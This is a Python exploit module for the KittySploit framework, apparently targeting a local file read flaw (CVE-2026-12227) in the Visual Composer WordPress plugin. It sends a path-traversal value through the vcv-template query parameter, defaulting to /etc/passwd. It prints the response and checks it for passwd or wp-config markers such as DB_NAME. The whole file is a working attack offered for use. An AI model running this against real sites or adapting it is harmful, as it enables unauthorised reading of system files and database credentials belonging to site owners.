#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Visual Composer CVE-2026-12227 — vcv-template file read."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "Visual Composer CVE-2026-12227 LFI",
        "description": "Local file read via vcv-template and vcv-template-type=vc query parameters.",
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-12227"],
        "tags": ["wordpress", "visualcomposer", "lfi", "auxiliary", "cve-2026-12227"],
    }

    path = OptString("/", "WordPress base path", required=False)
    template = OptString("../../../../../../../etc/passwd", "vcv-template traversal path", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        r = self.http_request(
            method="GET",
            path=self._join("/"),
            params={"vcv-template-type": "vc", "vcv-template": (self.template or "").strip()},
            allow_redirects=False,
        )
        if not r:
            print_error("Request failed")
            return False
        print_status((r.text or "")[:2500])
        if re.search(r"root:|DB_NAME", r.text or ""):
            print_success("File markers present in response")
        return True
